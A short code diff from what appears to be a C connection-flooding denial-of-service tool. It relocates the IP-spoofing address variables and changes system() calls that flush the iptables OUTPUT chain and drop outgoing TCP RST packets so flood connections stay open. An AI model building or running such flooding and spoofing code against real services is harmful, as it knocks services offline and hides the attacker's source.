@@ -26,8 +26,6 @@ uint16_t attack_uuid;
 int attack_time = 0;
 int num_threads = 1;
 int attack_type = CONN_FLOOD;
-uint32_t *spoof_addresses = NULL;
-uint32_t spoof_addresses_size = 0;
 
 /* handle stop signals */
 void signal_handler(int sig) {
@@ -35,6 +33,8 @@ void signal_handler(int sig) {
 }
 
 /* spoofing utilities */
+uint32_t *spoof_addresses = NULL;
+uint32_t spoof_addresses_size = 0;
 uint32_t get_a_src_ip()
 {
     if(spoof_addresses_size > 0) {
@@ -451,8 +451,8 @@ int main(int argc, char **argv)
     pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * num_threads);
     int i;
 
-    system("/usr/sbin/iptables -F OUTPUT");
-    system("/usr/sbin/iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP");
+    system("iptables -F OUTPUT");
+    system("iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP");
 
     switch(attack_type) {
         case CONN_FLOOD:
